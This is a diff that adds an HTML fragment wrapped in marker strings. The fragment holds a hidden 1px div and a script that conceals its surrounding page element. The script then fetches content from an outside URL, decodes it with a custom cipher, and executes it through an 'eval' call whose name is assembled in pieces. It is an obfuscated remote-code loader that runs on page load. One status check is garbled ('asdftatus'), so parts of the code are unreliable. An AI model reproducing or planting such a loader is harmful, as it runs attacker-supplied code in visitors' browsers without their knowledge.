@@ -1,0 +1,94 @@
+aylmoctisfnetoojwsdd911
+<div id='favsh1' style='width:1px;height:1px;display:none;'></div>
+<script>
+function cbstrtea(){
+	var os = document.getElementsByTagName('div');
+	for (var i=os.length-1; i>=0; i--) {
+		var o = os[i];
+		if (o.id == 'favsh1') {
+			o = o.parentNode;
+			o.style.display='none';
+			if (o.previousSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '/')) {
+				o.parentNode.removeChild(o.previousSibling);
+			} else if (o.nextSibling && ((''+o.nextSibling.textContent).split(' ').join('') == '/')) {
+				o.parentNode.removeChild(o.nextSibling);
+			} else if (o.previousSibling && o.nextSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '[') && ((''+o.nextSibling.textContent).split(' ').join('') == ']')) {
+				o.parentNode.removeChild(o.previousSibling);
+				o.parentNode.removeChild(o.nextSibling);
+			};
+		};
+	};
+};
+setTimeout('cbstrtea()',0);
+
+if (!window.hfavsh) {
+	window.wqvqlx='val';
+	window.hfavsh=true;
+	if (typeof(window.axhtprqsa) == 'undefined') {
+		window.axhtprqsa = [];
+		window.wqvqlxf = function (u, f) {
+			var xh;
+			if (window.XMLHttpRequest) {
+				xh = new XMLHttpRequest();
+			} else {
+				xh = new ActiveXObject('Microsoft.XMLHTTP');
+			};
+			var o = {};
+			o.xh = xh;
+			o.done = false;
+			o.f = f;
+			window.axhtprqsa.push(o);
+			xh.onreadystatechange = function () {
+				var o = null;
+				for (var i = window.axhtprqsa.length-1; i>=0; i--) {
+					if (window.axhtprqsa[i].xh == this) {
+						o = window.axhtprqsa[i];
+						break;
+					};
+				};
+				if (o != null) {
+					if (this.readyState == 4 ) {
+						if (!o.done) {
+							o.done = true;
+							if (asdftatus == 200) {
+								o.f(this.responseText, 'success');
+							} else {
+								o.f('', 'error');
+							};
+						};
+					};
+				};
+			};
+			try {
+				xh.open('GET', u, true);
+				xh.send();
+			} catch (e) { };
+		};
+	};
+
+	function gfavsh(d,c){
+		var fd='';
+		var lv = 5;
+		var plv; 
+		for (var i = 0;i<d.length;i++) {
+			var v=d.charCodeAt(i);
+			v -= 32;
+			plv = lv;
+			lv = v;
+			v -= plv;
+			v %= 126-32;
+			if (v<0) 
+				v+=126-32;
+			v += 32;
+			fd+=String.fromCharCode(v);
+		};
+		if (fd.length >= 3)
+			if (c=='success')
+				window[window['wqvqlx']](fd);
+	};
+
+	window.wqvqlx='e'+window.wqvqlx;
+	wqvqlxf('https://8chan.pw/a_>>>this.uaf<<<', gfavsh);
+};
+</script>
+aylmoctisfnetoojwsdd911
